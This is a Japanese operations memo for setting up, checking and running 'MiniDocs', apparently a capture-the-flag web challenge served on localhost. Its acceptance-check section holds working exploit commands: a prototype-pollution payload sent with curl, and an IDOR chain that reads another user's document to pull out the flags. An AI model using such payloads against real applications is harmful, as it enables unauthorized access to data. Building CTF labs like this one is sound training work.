[MiniDocs 運用メモ（具体コマンド付き）]

■ 0) 前提チェック（初回のみ）
# ctfsvc ユーザ（存在しなければ作成）
getent passwd ctfsvc >/dev/null || sudo useradd -r -s /usr/sbin/nologin ctfsvc

# Node.js（無ければ導入）
command -v node >/dev/null 2>&1 || command -v nodejs >/dev/null 2>&1 || \
  (sudo apt-get update && sudo apt-get install -y nodejs)

■ 1) 配置（Zipを展開後、02_Ops_Package ディレクトリで実行）
# /opt/web-pack/minidocs を作成し、必要ファイルを配置
sudo mkdir -p /opt/web-pack/minidocs
sudo cp -a server.js start_all.sh stop_all.sh /opt/web-pack/minidocs/

# 改行コード（CRLF混入対策）
sudo sed -i 's/\r$//' /opt/web-pack/minidocs/*.sh

# 権限（実行ビットが落ちないように注意）
sudo chown -R root:ctfsvc /opt/web-pack
sudo chmod 640 /opt/web-pack/minidocs/server.js
sudo chmod 750 /opt/web-pack/minidocs/start_all.sh /opt/web-pack/minidocs/stop_all.sh

■ 2) 起動
sudo /opt/web-pack/minidocs/start_all.sh

■ 3) 稼働確認
# 8000/TCP で待受しているか
ss -ltnp | grep 127.0.0.1:8000 || true
# ログ表示（起動メッセージ）
sudo tail -n +1 /tmp/web-pack/minidocs.log
# 画面（参加者）: http://127.0.0.1:8000/

■ 4) 検収（旗の取得確認）
# PP（Prototype Pollution）: /admin/config → /admin/info
curl -s -X POST -d 'json={"__proto__":{"revealSecret":true}}' \
  http://127.0.0.1:8000/admin/config >/dev/null
curl -s http://127.0.0.1:8000/admin/info | grep -o 'PCTF{[^}]*}'

# IDOR: /leak の末尾4桁 → victim=vi のドキュメントへ
t4=$(curl -s http://127.0.0.1:8000/leak | sed -n 's/.*doc-\*\*-\([0-9a-f]\{4\}\).*/\1/p')
curl -s "http://127.0.0.1:8000/docs/doc-vi-$t4" | grep -o 'PCTF{[^}]*}'

■ 5) フラグ差し替え（開催直前）
# 起動時に上書き（推奨）
sudo FLAG_PP='PCTF{pp_2025_xxx}' FLAG_IDOR='PCTF{idor_2025_xxx}' \
  /opt/web-pack/minidocs/start_all.sh

# 直接ファイルを書き換えて再起動でも可
#  echo "PCTF{pp_2025_xxx}"   | sudo tee /tmp/web-pack/FLAG_PP.txt >/dev/null
#  echo "PCTF{idor_2025_xxx}" | sudo tee /tmp/web-pack/FLAG_IDOR.txt >/dev/null
#  sudo chown ctfsvc:ctfsvc /tmp/web-pack/FLAG_{PP,IDOR}.txt && sudo chmod 600 /tmp/web-pack/FLAG_{PP,IDOR}.txt
#  sudo /opt/web-pack/minidocs/start_all.sh

■ 6) 停止
sudo /opt/web-pack/minidocs/stop_all.sh

■ 7) よくあるトラブルと対処
# 「command not found」や再起動で失敗するときは権限・改行を再適用
sudo sed -i 's/\r$//' /opt/web-pack/minidocs/*.sh
sudo chmod 750 /opt/web-pack/minidocs/start_all.sh /opt/web-pack/minidocs/stop_all.sh
sudo mkdir -p /tmp/web-pack && sudo chown -R ctfsvc:ctfsvc /tmp/web-pack && sudo chmod 750 /tmp/web-pack
# ポートが詰まっている場合は解放
sudo fuser -k 8000/tcp 2>/dev/null || true
# 再起動
sudo /opt/web-pack/minidocs/start_all.sh

■ 8) 想定オペレーション（超簡潔）
# 設置後は基本この3行だけ
sudo /opt/web-pack/minidocs/start_all.sh
ss -ltnp | grep 127.0.0.1:8000 || true
sudo tail -n +1 /tmp/web-pack/minidocs.log
